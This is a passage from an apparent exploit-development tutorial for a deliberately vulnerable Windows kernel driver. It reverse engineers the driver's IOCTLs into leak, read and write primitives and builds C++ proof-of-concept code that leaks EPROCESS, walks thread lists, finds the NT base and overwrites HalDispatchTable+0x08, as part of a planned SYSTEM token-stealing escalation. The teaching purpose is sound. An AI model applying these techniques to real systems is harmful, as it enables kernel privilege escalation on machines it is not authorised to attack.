<p>We then move on to the function epilogue where we see the NTSTATUS code is moved in to the IOSTATUS filed of the IRP  via the mov [rsi+30h], ebx instruction. The number of bytes to send back to user mode is set to 8 bytes and updated in the Info field of the IRP with the mov qword ptr [rsi+38h], 8 instruction. The epilogue then calls IoCompleteRequest and performs cleanup on the stack and registers before returning. The epilogue shows us that every IOCTL in this simple driver reports that 8 bytes will be returned to the user. Since we see the EPROCESS address copied to the SystemBuffer in the IOCTL 0x2237FC code block we know that this leaks the EPROCESS back to us. The RE process will be harder in the real world. You will need to follow the code using knowledge of the IRP and look for those key indicators that data you control is being used and data you want is being returned to find a leak like this.</p>

<p><img src="/assets/images/post3-ida-sub1000-3.png" alt="post3-ida-sub1000-3.png" /></p>

<p>We scroll back up to the prologue to analyze the next IOCTL. We see that if the sub ecx, 2237FCh instruction does not result in zero that we then sub, ecx 404h. When this operation results in zero we then make another check that the output buffer (SystemBuffer) is at least 8 bytes. This tells us that the next IOCTL is 0x223C00 which is 0x2237FC + 0x404. We see that after the output buffer check we simple move the first QWORD from the SystemBuffer into rax with the mov rax, [rdi] instruction. We then copy the QWORD pointed to by rax in to rcx with the mov rcx, [rax] instruction. The QWORD in rcx is then copied in to the first QWORD of the SystemBuffer to return to the user-mode caller with the mov [rdi], rcx instruction.  This is the same code block that is used by our EPROCESS leak IOCTL so we know it then leads to the epilogue to return the data to us. This is a read primitive it its most simplest form. We are looking for a dereference to a value we can control and then return the data to us. It will most likely be more convoluted or complex in a real world scenario where you need to follow long code paths to find the arbitrary read or you may need to find an out-of-bound write or overflow to corrupt and object to point to something you control instead of the intended target.</p>

<p><img src="/assets/images/post3-ida-sub1000-4.png" alt="post3-ida-sub1000-4.png" /></p>

<p>We then move on to analyze our third IOCTL. We see that if the sub ecx, 404h does not result in 0 that we then compare ecx to 4 with the cmp ecx, 4 instruction. We jump to an NTSTATUS error code if the value is not 4 and jump to the IOCTL code block if it is 4. This tells us that this is the last IOCTL and that it has an IOCTL of 0x223C04 which is 0x223C00 + 0x4. We see a slight difference on the next check compared to the previous IOCTLs. This time we see a cmp dword ptr [r8+10h], 8 instruction. This time we are checking to ensure that the InputBuffer (SystemBuffer) is at least 8 bytes. When we pass the check we then move the first QWORD from the InputBuffer in to rcx with the mov rcx, [rdi] instruction. We then move the second QWORD from the InputBuffer to rax with the mov rax, [rdi+8] instruction. We then see that the QWORD in rax is moved in to the address pointed to by rcx with the mov [rcx], rax. Since we control both values that means we can load rcx with an arbitrary memory address and then write a QWORD we control to it making this a simple write primitive. In the real world you probably will not get lucky enough to find something this simple either and will also look for object corruption to take control of where the QWORD is being written to. You may also notice another vulnerability in this code that is more of just poor coding. We only check to make sure the InputBuffer is at least 8 bytes but we use at least 0x10 bytes. If we send an I/O Request to this IOCTL with an InputBuffer Length of 0x8 we will pass the test and move the second QWORD in the buffer to the address passed as the first QWORD. It would still result in an arbitrary write, we would just be writing whatever QWORD is in the buffer at the +0x8 offset, most likely 0x0 if we properly initialized and zeroed our buffer. We should have set our check in the driver to ensure the InputBuffer is at least 0x10 bytes. It doesn’t get us anything in this scenario, but a subtle mistake like that could be what leads you to controlling what is written in a real world scenario.</p>

<p><img src="/assets/images/post3-ida-sub1000-4.png" alt="post3-ida-sub1000-4.png" /></p>

<p>We now have enough information to start writing an exploit for this driver. Our goal is to steal the SYSTEM token and copy it over our process’s token to elevate our permissions to SYSTEM. We will use the follow generalized steps:</p>

<ol>
  <li>Leak the EPROCESS of our current process</li>
  <li>Walk the EPROCESS thread links to find our KTHREAD</li>
  <li>Use the read primitive to leak the nt!EmpCheckErrataList address at KTHREAD+0x2a8</li>
  <li>Scan back from the nt!EmpCheckErrataList address to find the NT base address</li>
  <li>Scan up from NT Base to find  nt!MiGetPteAddress+0x13 to find the PTE start address</li>
  <li>Find Kernel StackBase for our KTHREAD</li>
  <li>Copy token stealing shellcode to Kernel Stack</li>
  <li>Change our Kernel Stack to executable via its PTE</li>
  <li>Scan up from NT base to find the HalDispatchTable</li>
  <li>Hijack HalDispatchTable+0x08</li>
  <li>Call NtQueryIntervalProfile to trigger our shellcode</li>
  <li>Restore HalDispatchTable+0x08</li>
  <li>Spawn SYSTEM shell</li>
</ol>

<p>VBS/HVCI must be off for us to execute dynamic code in kernel-mode. We will do the simpler data-only attack at the end of the demo. We will iterate through our development of our exploit by starting with a simple POC to validate we can interact with the IOCTLs and receive the expected results. We will start by right clicking our solution in Visual Studio and selecting add -&gt; New Project.  Select Console App C++ and click next. We will name the project assvd_user for Apex Stupidly Simple Vulnerable Driver user-mode and click next.</p>

<p><img src="/assets/images/post3-visual-studio-new-project-1.png" alt="post3-visual-studio-new-project-1.png" /></p>

<p><img src="/assets/images/post3-visual-studio-new-project-2.png" alt="post3-visual-studio-new-project-2.png" /></p>

<p>The first chunk of code for our exploit contains our includes for iostream and windows.h. The iostream gives us our printf() and getchat() functions. The windows.h gives us our FormatMessageA(), CreateFile(), DeviceIoControl(), and data types. We then define the printLastErrorMessage() function. This function takes the error codes produced by GetLastError() and turns it in to an error message that actually makes sense. It was helpful in troubleshooting the code when receiving errors. It takes a custom error message that we set when we call the function and then calls GetLastError(). The result of GetLastError() is fed into FormatMessageA() which is a helpful Win32 API to give us an actual error message based off of the error code. We then combine our custom error message with the official error message.</p>

<pre><code class="language-C++">#include &lt;iostream&gt;
#include &lt;Windows.h&gt;

void printLastErrorMessage(const char* customMessage) {
    DWORD errorCode = GetLastError(); // Retrieve the last error code
    if (errorCode == 0) {
        printf("%s: No error.\n", customMessage);
        return;
    }

    LPVOID errorMsgBuffer = NULL;

    // Format the error message from the system
    DWORD size = FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,                       // No source, use system message table
        errorCode,                  // Error code
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language
        (LPSTR)&amp;errorMsgBuffer,     // Output buffer
        0,                          // Minimum size
        NULL                        // No arguments
    );

    if (size == 0) {
        printf("%s: Unknown error code %lu.\n", customMessage, errorCode);
    }
    else {
        // Remove trailing newlines from the system message
        char* msg = (char*)errorMsgBuffer;
        for (char* p = msg; *p; p++) {
            if (*p == '\r' || *p == '\n') {
                *p = '\0';
                break;
            }
        }
        printf("%s: (Error %lu) %s\n", customMessage, errorCode, msg);
    }

    // Free the buffer allocated by FormatMessage
    if (errorMsgBuffer) {
        LocalFree(errorMsgBuffer);
    }
}
</code></pre>

<p>The next code chunk starts the main() function definition. We start with opening a handle to our driver using the CreateFile() API. We pass the name of the driver that we pulled from our static analysis, request GENERIC_READ and GENERIC_WRITE  permissions, and open existing instead of creating a new file. This returns a handle to the driver back to us.</p>

<pre><code class="language-C++">int main()
{

    HANDLE driver_handle = CreateFile(L"\\\\.\\ApexDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, NULL, NULL);
    if (driver_handle == INVALID_HANDLE_VALUE)
    {
        printLastErrorMessage("[!] Failed to open file");
        exit(1);
    }
    printf("[+] Successfully obtained the driver handle.\n");

</code></pre>

<p>The next chunk calls GetCurrentProcessId() to determine the PID of our process. It then defines our IOCTL to test the EPROCESS leak. We then allocate our input and output buffers based off of the specified buffer lengths of 0x10 and 0x8 (sizeof(ULONGLONG)) and then we zero out the allocated memory. We then call DeviceIoControl() by passing the handle to the driver, the IOCTL code, the input buffer, input buffer length, output buffer, output buffer length, and a pointer to receive the number of bytes returned. If the call to DeviceIoControl() fails we print the error message “[!] Failed DeviceIoControl call” and add the error code and error message with the printLastErrorMessage() function. We print the number of bytes returned and the kernel-mode address of our current process’s EPROCESS structure on a successful call. We use getchar() to pause our code. This is important for troubleshooting. If we have errors in our code that generates a bugcheck we will crash before the printf() functions print to the screen making it hard to tell which part of the code failed. The pause ensures we do not move on to another potentially dangerous section of code until we press enter on the keyboard so we know exactly where we crashed.</p>

<pre><code class="language-C++">    ULONG pid = GetCurrentProcessId();
    printf("[+] Current Process Id: %lu\n", pid);
    
    ULONG ioctl = 0x2237fc;
    ULONG driver_input_buffer_length = 0x10;
    LPVOID driver_input_buffer = malloc(driver_input_buffer_length);
    memset(driver_input_buffer, 0x00, 0x10);
    ULONG driver_output_buffer_length = sizeof(ULONGLONG);
    LPVOID driver_output_buffer = malloc(driver_output_buffer_length);
    memset(driver_output_buffer, 0x00, sizeof(ULONGLONG));
    ((PULONGLONG)driver_input_buffer)[0] = pid;

    printf("[+] Output buffer allocated at: %p \n", driver_output_buffer);

    getchar();

    DWORD lpBytesReturned;
    if (!DeviceIoControl(driver_handle, ioctl, driver_input_buffer, driver_input_buffer_length, driver_output_buffer, driver_output_buffer_length, &amp;lpBytesReturned, NULL))
    {
        printLastErrorMessage("[!] Failed DeviceIoControl call");
    }
    printf("[+] Number of bytes returned %d\n", lpBytesReturned);
    printf("[+] Current EPROCESS: %llx\n", ((PULONGLONG)(driver_output_buffer))[0]);

    getchar();
</code></pre>

<p>We then setup our next IOCTL to call the read primitive. We copy the returned EPROCESS address to the input buffer so that we can read the first QWORD of the EPROCESS structure. We verify that it is correct in the debugger when we run our Proof-Of-Concept (POC). We then call DeviceIoControl again with the new IOCTL. We print the error message or the first QWORD depending on whether or not the call was successful.</p>

<pre><code class="language-C++">    ioctl = 0x223c00;
    ULONGLONG eProcess = ((PULONGLONG)(driver_output_buffer))[0];
    ((PULONGLONG)driver_input_buffer)[0] = eProcess;

    if (!DeviceIoControl(driver_handle, ioctl, driver_input_buffer, driver_input_buffer_length, driver_output_buffer, driver_output_buffer_length, &amp;lpBytesReturned, NULL))
    {
        printLastErrorMessage("[!] Failed DeviceIoControl call");
    }
    printf("[+] first QWORD stored at Current EPROCESS: %llx\n", ((PULONGLONG)(driver_output_buffer))[0]);

    getchar();
</code></pre>

<p>We setup our IOCTL for the write primitive on the next chunk. We set an easy to spot QWORD of 0x1234567812345678 in the junk variable and place that as the second QWORD in the input buffer which correlates to the value to write. We then hardcode the kernel-mode address  of NT base. We determine the address in the kernel-mode debugger with:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lm m nt
</code></pre></div></div>

<p>We then use a static offset to the HalDispatchTable in Windows 11 25H2 to determine the current kernel-mode address of the HalDispatchTable offset 0x08.  We then place that address as the first QWORD in the input buffer to specify where we want to write to. We then call DeviceIoControl with the write primitive IOCTL, print the error message if it fails, print the address that was written to if it succeeds, and then pause. We can then check in the debugger to verify we calculated the correct address of the HalDispatchTable and that our value was written when we run the POC.</p>

<pre><code class="language-C++">    driver_input_buffer_length = 0x10;
    ioctl = 0x223c04;
    ULONGLONG junk = 0x1234567812345678;
    ULONGLONG ntBase = 0xfffff804cc400000;
    ULONGLONG haldispatch = ntBase + 0x00e00708;
    ((PULONGLONG)driver_input_buffer)[0] = haldispatch;
    ((PULONGLONG)((ULONGLONG)driver_input_buffer + 0x08))[0] = junk;


    if (!DeviceIoControl(driver_handle, ioctl, driver_input_buffer, driver_input_buffer_length, driver_output_buffer, driver_output_buffer_length, &amp;lpBytesReturned, NULL))
    {
        printLastErrorMessage("[!] Failed DeviceIoControl call");
    }
    printf("[+] address written to: %llx\n", ((PULONGLONG)(driver_output_buffer))[0]);

    getchar();
</code></pre>

<p>The last code chunk calls the read primitive again so that we can print the value written to HaldDispatchTable+0x08 to verify our write primitive worked. This makes it so that we do not have to use the debugger each time we run the POC to verify the write. We then pause before exiting the process. We will generate a bugcheck when another process attempts to call HalDisptachTable+0x08 since we overwrote the legitimate address in the table with a junk QWORD, but this did validate that we can interact with the driver and that the IOCTLs work as expected.</p>

<pre><code class="language-C++">    ioctl = 0x223c00;
    ((PULONGLONG)driver_input_buffer)[0] = haldispatch;

    if (!DeviceIoControl(driver_handle, ioctl, driver_input_buffer, driver_input_buffer_length, driver_output_buffer, driver_output_buffer_length, &amp;lpBytesReturned, NULL))
    {
        printLastErrorMessage("[!] Failed DeviceIoControl call");
    }
    printf("[+] Value written to address: %llx\n", ((PULONGLONG)(driver_output_buffer))[0]);

    getchar();
    return 0;
}
</code></pre>

<p>We check out hard coded offsets before compiling using the following commands:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lm m nt

?nt!HalDispatchTable+0x08 - nt

dqs nt!HalDispatchTable+0x08 L1
</code></pre></div></div>

<p><img src="/assets/images/post3-windbg-ntbase-hal.png" alt="post3-windbg-ntbase-hal.png" /></p>

<p>We need to change the Runtime Library settings in the POC project settings before compiling as well. Right click on the assvd_user project and select properties. Expand the C/C++ category and select Code Generation. Change the Runtime Library option from Multi-threaded (/MD) to Multi-threaded (/MT). The MD setting compiles the POC with a dynamic runtime library which will require installing a specific MSVSC runtime version on the test machine. The MT setting will compile the POC with a static version of the Runtime library so that it does not need to be installed.</p>

<p><img src="/assets/images/post3-visual-studio-runtime.png" alt="post3-visual-studio-runtime.png" /></p>

<p>We can now compile the driver and the POC. We copy our driver and POC over to our test machine after compiling. I copied both to the desktop. Open an administrator command prompt and load the driver with:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc create ApexDriver binPath= "C:\Users\Apex\Desktop\ApexDriver.sys" type= kernel start= auto
</code></pre></div></div>

<p>Ensure that you have a space between the options and their values for example type= kernel and not type=kernel. If you receive a certificate error then you need to turn test signing on again and reboot the system.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bcdedit -set TESTSIGNING ON
</code></pre></div></div>

<p>You can query the status of the new service with the sc command and start the service to load the driver if it is not running.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc query ApexDriver

sc start ApexDriver
</code></pre></div></div>

<p><img src="/assets/images/post3-create-service.png" alt="post3-create-service.png" /></p>

<p>We can now run our POC and verify that it works as expected. Open a non-admin command prompt and run the POC. When we hit are first pause we see the PID for our current process, 7548 in this demo, and the address of the output buffer. We then hit the enter key and see 8 bytes were returned and a kernel-mode address for the EPROCESS structure of our process, 0xFFFF938593bce0c0 in this demo. We then switch to the debugger to verify the EPROCESS.</p>

<p><img src="/assets/images/post3-poc0-1.png" alt="post3-poc0-1.png" /></p>

<p>Break in the debugger and search for the process with:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>!process assvd_user.exe 0 0
</code></pre></div></div>

<p>Sometimes WinDbg is unable to find the process by name and will list the SYSTEM process instead. If you receive a long scrolling list of threads then it has returned the SYSTEM process. You can then list every process with:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>!process 0 0
</code></pre></div></div>

<p><img src="/assets/images/post3-windbg-poc0-1.png" alt="post3-windbg-poc0-1.png" /></p>

<p>You should then see the assvd_user.exe process towards the bottom of the list to verify. You can also use the !process command with the EPROCESS address that was returned to verify.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>!process ffff938593bce0c0
</code></pre></div></div>

<p><img src="/assets/images/post3-windbg-poc0-2.png" alt="post3-windbg-poc0-2.png" /></p>

<p>We now know that the EPROCESS leak works as expected. We hit enter to move on to testing the read primitive. We read the first QWORD of the EPROCESS kernel-mode address and see that the value is 0x3.</p>

<p><img src="/assets/images/post3-poc0-2.png" alt="post3-poc0-2.png" /></p>

<p>We verify this is the correct QWORD by breaking in the debugger and using the dqs command with the EPROCESS address.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dqs ffff938593bce0c0 L1
</code></pre></div></div>

<p><img src="/assets/images/post3-windbg-poc0-3.png" alt="post3-windbg-poc0-3.png" /></p>

<p>The QWORD at address 0xffff938593bce0c0 matches the output on our command prompt confirming that the read primitive works as expected. We can now hit the enter key to test the write primitive.</p>

<p><img src="/assets/images/post3-poc0-3.png" alt="post3-poc0-3.png" /></p>

<p>Switch back to the debugger and break to verify the address and that our junk QWORD was indeed written to the appropriate place. We used static offsets to overwrite nt!HalDispatchTable+0x08 so we can use the following command to verify both the address and our QWORD:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dqs nt!HalDispatchTable
</code></pre></div></div>

<p><img src="/assets/images/post3-windbg-poc0-4.png" alt="post3-windbg-poc0-4.png" /></p>

<p>We can now see that the from our command prompt output does match nt!HalDispatchTable+0x08 and that our junk QWORD has overwritten the function pointer at that location. We now hit enter and finish execution of the POC. You may trigger the bugcheck as soon as your resume execution in WinDbg. WinDbg shows that a bugcheck code 139 occurred. Reviewing the call stack shows that this was a KCFG fault (nt!guard_icall_handler+01e) indicating that the HalDispatchTable hijack still works as an indirect call was made to a non-kernel-mode address (0x1234567812345678).</p>

<p><img src="/assets/images/post3-windbg-poc0-bugcheck-1.png" alt="post3-windbg-poc0-bugcheck-1.png" /></p>

<p><img src="/assets/images/post3-windbg-poc0-bugcheck-2.png" alt="post3-windbg-poc0-bugcheck-2.png" /></p>

<p>We can now start developing the exploit in an iterative manner by implementing and testing features one at a time. We will start with building a function to call the read primitive. This will make the read primitive modular and reusable throughout our code.  The next POC starts with the same includes and printLastErrorMessage() function as our initial POC. The POC then defines the readQWORD() function that takes an address to read from, a handle to the driver, and the address space containing input and output buffers as parameters. We then setup the I/O request using the provided parameters and trigger the arbitrary read. The main function opens the handle to the driver and then determines the PID of the current process and prints it to the screen. It then allocates the read buffer with a size of 0x2000. The first 0x1000 bytes are used for the input buffer and the second 0x1000 bytes are used for the output buffer. The code then uses a hard coded address for nt!HalDispatchTable+0x08 to read the legitimate function pointer at that address and prints the result to the screen</p>

<pre><code class="language-C++">#include &lt;iostream&gt;
#include &lt;Windows.h&gt;

void printLastErrorMessage(const char* customMessage) {
    DWORD errorCode = GetLastError(); // Retrieve the last error code
    if (errorCode == 0) {
        printf("%s: No error.\n", customMessage);
        return;
    }

    LPVOID errorMsgBuffer = NULL;

    // Format the error message from the system
    DWORD size = FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,                       // No source, use system message table
        errorCode,                  // Error code
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language
        (LPSTR)&amp;errorMsgBuffer,     // Output buffer
        0,                          // Minimum size
        NULL                        // No arguments
    );

    if (size == 0) {
        printf("%s: Unknown error code %lu.\n", customMessage, errorCode);
    }
    else {
        // Remove trailing newlines from the system message
        char* msg = (char*)errorMsgBuffer;
        for (char* p = msg; *p; p++) {
            if (*p == '\r' || *p == '\n') {
                *p = '\0';
                break;
            }
        }
        printf("%s: (Error %lu) %s\n", customMessage, errorCode, msg);
    }

    // Free the buffer allocated by FormatMessage
    if (errorMsgBuffer) {
        LocalFree(errorMsgBuffer);
    }
}

ULONGLONG readQWORD(ULONGLONG addr, HANDLE driver, PULONGLONG readBuf)
{



    ULONG IoControlCode = 0x223c00;
    PULONGLONG inBuf = readBuf;
    ULONG inBufLength = sizeof(ULONGLONG);
    PULONGLONG outBuf = ((PULONGLONG)((ULONGLONG)readBuf + 0x1000));
    ULONG outBufLength = sizeof(ULONGLONG);
    ULONG lpBytesReturned;

    inBuf[0] = addr;

    BOOL triggerIOCTL;
    triggerIOCTL = DeviceIoControl(driver, IoControlCode, inBuf, inBufLength, outBuf, outBufLength, &amp;lpBytesReturned, NULL);
    if (!triggerIOCTL)
    {
        printLastErrorMessage("[!] Failed to read QWORD");
    }

    ULONGLONG result = outBuf[0];
    return result;
}

int main()
{

    HANDLE apexHandle = CreateFile(L"\\\\.\\ApexDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, NULL, NULL);
    if (apexHandle == INVALID_HANDLE_VALUE)
    {
        printLastErrorMessage("[!] Failed to open file");
        exit(1);
    }
    printf("[+] Successfully obtained the driver handle.\n");

    ULONG pid = GetCurrentProcessId();
    printf("[+] Current Process Id: %lu\n", pid);


    PULONGLONG readBuf = (PULONGLONG)VirtualAlloc((PULONGLONG)0x000000001a000000, 0x2000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    memset((PULONGLONG)0x000000001a000000, 0x00, 0x1000);
    memset((PULONGLONG)0x000000001a001000, 0x00, 0x1000);
    ULONGLONG addr = 0xfffff806c3a00708;
    ULONGLONG qword = readQWORD(addr, apexHandle, readBuf);

    printf("[+] Read QWORD: 0x%llx\n", qword);


    return 0;
}
</code></pre>

<p>We use the following command to retrieve the address for nt!HalDispatchTable+0x08:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dqs nt!HalDispatchTable+0x08
</code></pre></div></div>

<p><img src="/assets/images/post3-windbg-poc1-1.png" alt="post3-windbg-poc1-1.png" /></p>

<p>The WinDbg output shows us the address to use is 0xffff806c3a00708 and the value stored there for nt!HaliQuerySystemInfomration is 0xfffff806c3761a90.  We receive the same value when we run out POC verifying that it works as intended.</p>

<p><img src="/assets/images/post3-poc1-1.png" alt="post3-poc1-1.png" /></p>

<p>Next we write a function to leak the EPROCESS address using the EPROCESS leak IOCTL. We also want this one to be modular and reusable so that we can use it to determine our EPROCESS address and the SYSTEM process’s EPROCESS address when we steal the SYSTEM token to escalate our privilege level later. The leakEProcess function takes a PID, the handle to the driver, and the read buffer as parameters. It then sets up the IOCTL call to trigger the EPROCESS leak using the provided parameters.  We add in some error handling to print any error messages if the IOCTL call fails and gracefully exit the application. We place this function definition after the readQWORD() definition and then make minor changes to the main() function. We move the GetCurrentProcessId() call and the printf() statement to the bottom right before we call leakEProcess() and print it’s results. We throw in a getchar() call before the application exists so that we can verify the EPROCESS address is correct. Once the application exits the process is terminated and the EPROCESS address is no longer valid. We tested the EPROCESS leak earlier and know that it works, but it is still important to test during our iterative exploit build to ensure we did not introduce any errors with our changes.</p>

<pre><code class="language-C++">...
ULONGLONG leakEProcess(ULONG pid, HANDLE driver, PULONGLONG inBuff)
{
    ULONG IoControlCode = 0x2237fc;
    PULONGLONG inBuf = inBuff;
    ULONG inBufLength = sizeof(ULONGLONG);
    PULONGLONG outBuf = ((PULONGLONG)((ULONGLONG)inBuff + 0x1000));
    ULONG outBufLength = sizeof(ULONGLONG);
    ULONG lpBytesReturned;

    inBuf[0] = pid;

    BOOL triggerIOCTL;
    triggerIOCTL = DeviceIoControl(driver, IoControlCode, inBuf, inBufLength, outBuf, outBufLength, &amp;lpBytesReturned, NULL);
    if (!triggerIOCTL)
    {
        printLastErrorMessage("[!] Failed to retrieve EPROCCESS");
        exit(1);
    }

    ULONGLONG result = outBuf[0];
    return result;
}

int main()
{

    HANDLE apexHandle = CreateFile(L"\\\\.\\ApexDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, NULL, NULL);
    if (apexHandle == INVALID_HANDLE_VALUE)
    {
        printLastErrorMessage("[!] Failed to open file");
        exit(1);
    }
    printf("[+] Successfully obtained the driver handle.\n");

    PULONGLONG readBuf = (PULONGLONG)VirtualAlloc((PULONGLONG)0x000000001a000000, 0x2000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (readBuf == NULL)
    {
        printLastErrorMessage("[!] Failed to allocate buffer memory");
        exit(1);
    }
    memset((PULONGLONG)0x000000001a000000, 0x00, 0x1000);
    memset((PULONGLONG)0x000000001a001000, 0x00, 0x1000);
    printf("[+] Allocated buffer memory: 0x%llx\n", readBuf);

    ULONG pid = GetCurrentProcessId();
    printf("[+] Current Process Id: %lu\n", pid);
    ULONGLONG eProcess = leakEProcess(pid, apexHandle, readBuf);
    printf("[+] Current EPROCESS located at: 0x%llx\n", eProcess);

	getchar();
    return 0;
}
</code></pre>

<p>We run the POC and see in this demo that the current PID is 3488 and the EPROCESS is 0xffff9b86099e90c0.</p>

<p><img src="/assets/images/post3-poc2-1.png" alt="post3-poc2-1.png" /></p>

<p>We verify this is correct by searching for our process in WinDbg with:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>!process assvd_user.exe
</code></pre></div></div>

<p>or:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>!process 0 0
</code></pre></div></div>

<p><img src="/assets/images/post3-windbg-poc2-1.png" alt="post3-windbg-poc2-1.png" /></p>

<p><img src="/assets/images/post3-windbg-poc2-2.png" alt="post3-windbg-poc2-2.png" /></p>

<p>We have verified that the EPROCESS leak is working as intended. We resume execution in WinDbg with the g command and then hit enter on the command prompt on the test machine to verify the application finishes and the system does not crash. We can now check item 1 off of our list now that we have the EPROCESS of our current process. We then move on to item 2 and walk the EPROCESS to find our KTHREAD.</p>

<p>We add in the hard coded offsets within the EPROCESS and ETHREAD structures at the top of our POC code below the include statements. These offsets can change when the structures are updated in newer Windows versions, however, they do not seem to change as much as other offsets like the offset to nt!HalDispatchTable or nt!MiGetPteAddress. We then add the walkEProcess() function definition. The walkEProcess() function takes the EPROCESS structure address, a handle to the driver, and the read buffer as parameters. It starts by obtaining the current thread ID with GetCurrentThreadId(). It then reads the EPROCESS ThreadListHead to retrieve the forward link to the doubly linked thread list. It then reads the UniqueThread value for the linked thread and compares it to the current thread ID. If the IDs match then it has found the correct thread and retrieves the KTHREAD structure address which is the first member (Tcb) of the ETHREAD which matches the address of the thread in the EPROCESS ThreadList. If the IDs do not match the function moves on to the next thread in the ThreadList and repeats the process until the correct UniqueThread is found. The corresponding KTHREAD is then returned by the walkEProcess() function. We then add the walkEProcess() function call and printf statement above the getchar() call in the main() function.</p>

<pre><code class="language-C++">#include &lt;iostream&gt;
#include &lt;Windows.h&gt;

#define EPROCESS_ThreadListHead_Offset 0x370
#define ETHREAD_ThreadListEntry_Offset 0x578
#define ETHREAD_Tcb_Offset             0x000
#define ETHREAD_Cid_Offset             0x508
#define CLIENTID_UniqueThread_Offset   0x8

...

ULONGLONG walkEProcess(ULONGLONG eProcess, HANDLE driver, PULONGLONG readBuf) {
    DWORD currentTid = GetCurrentThreadId();

    ULONGLONG listHead = eProcess + EPROCESS_ThreadListHead_Offset;
    ULONGLONG flink = readQWORD(listHead, driver, readBuf);

    while (flink != listHead) {
        ULONGLONG ethread = flink - ETHREAD_ThreadListEntry_Offset;

        ULONGLONG uniqueTid = readQWORD(ethread + ETHREAD_Cid_Offset + CLIENTID_UniqueThread_Offset, driver, readBuf);

        if ((DWORD)uniqueTid == currentTid) {
            ULONGLONG kthread = ethread;  // Tcb is at offset 0x0
            printf("[+] Found current thread:\n");
            printf("[+] ETHREAD: 0x%llx\n", ethread);
            printf("[+] KTHREAD: 0x%llx\n", kthread);
            return kthread;
        }

        flink = readQWORD(flink, driver, readBuf);  // Move to next thread
    }

    printf("[-] Current thread not found in EPROCESS thread list.\n");
    exit(1);
}

int main()
{
...

    ULONGLONG kThread = walkEProcess(eProcess, apexHandle, readBuf);


    printf("[+] KTHREAD located at: 0x%llx\n", kThread);
    getchar();
    
    return 0;
}
</code></pre>

<p>We verify our hard coded offsets with:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dt nt!_EPROCESS ThreadListHead

dt nt!_ETHREAD ThreadListEntry

dt nt!_ETHREAD Tcb

dt nt!_ETHREAD Cid

dt nt!_ETHREAD Cid.UniqueThread
</code></pre></div></div>

<p><img src="/assets/images/post3-windbg-poc3-1.png" alt="post3-windbg-poc3-1.png" /></p>

<p>Compile the POC and run it on the test VM.</p>

<p><img src="/assets/images/post3-poc3-1.png" alt="post3-poc3-1.png" /></p>

<p>We verify it retrieved the correct KTHREAD address in WinDbg with the !process command. My WinDbg is still refusing to find the process so !process 0 0 is used and then !process with the EPROCESS address for the entry under assvd_user.exe.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>!process 0 0

!process ffff9b860a5d8080
</code></pre></div></div>

<p><img src="/assets/images/post3-windbg-poc3-2.png" alt="post3-windbg-poc3-2.png" /></p>

<p>Resume execution in WinDbg with the g command and then hit the enter key on the test VM to ensure that application returns cleanly and does not generate a bugcheck. We then move on to items 3 and 4 on our list. We define the leakNtBase() function after the walkEProcess() function. The leakNtBase() function takes the KTHREAD address, a handle to the driver, and the read buffer as its parameters. The function then uses the read primitive to read the KTHREAD + 0x2a8 to find the address of nt!EmpCheckErrataList. This address has been found at this offset in the KTHREAD reliably across several Windows versions based on the research of Morten Schenk. The function then scans backwards from that leaked NT address searching for the PE header signature of 0x00905a4d. We subtract 0x400000 from the leaked address to skip the false positives due to the rearranging of the sections with in the PE as explained by <a href="https://wumb0.in/finding-the-base-of-the-windows-kernel.html">wumb0</a>. The function reads the first QWORD of a page to match against the signature and moves backwards another page (0x1000) if the signature is not found. It returns the NT base address when it finds the signature. We add in the call to leakNtBase and a printf() statement before the return in the main() function. We can remove the getchar() call for now since we do not need to pause execution of the POC to verify the NT base address in the debugger.</p>

<pre><code class="language-C++">...

ULONGLONG leakNtBase(ULONGLONG kthread, HANDLE driver, PULONGLONG readBuf)
{

    ULONGLONG ntAddr = readQWORD(kthread + 0x2a8, driver, readBuf);
    ULONGLONG baseAddr;
    ULONGLONG signature = 0x00905a4d;
    ULONGLONG searchAddr = (ntAddr - 0x400000) &amp; 0xFFFFFFFFFFFFF000;

    while (TRUE)
    {
        ULONGLONG readData = readQWORD(searchAddr, driver, readBuf);
        ULONGLONG tmp = readData &amp; 0xFFFFFFFF;

        if (tmp == signature)
        {
            baseAddr = searchAddr;
            break;
        }
        searchAddr = searchAddr - 0x1000;
    }
    return baseAddr;
}

int main()
{

...

    ULONGLONG ntBase = leakNtBase(kThread, apexHandle, readBuf);
    printf("[+] NT Base Address: 0x%llx\n", ntBase);
    
    return 0;
}
</code></pre>

<p>Compile the POC and run it on the test VM. We will see the NT Base address printed to the screen. The POC then returns and does not generate a crash.</p>

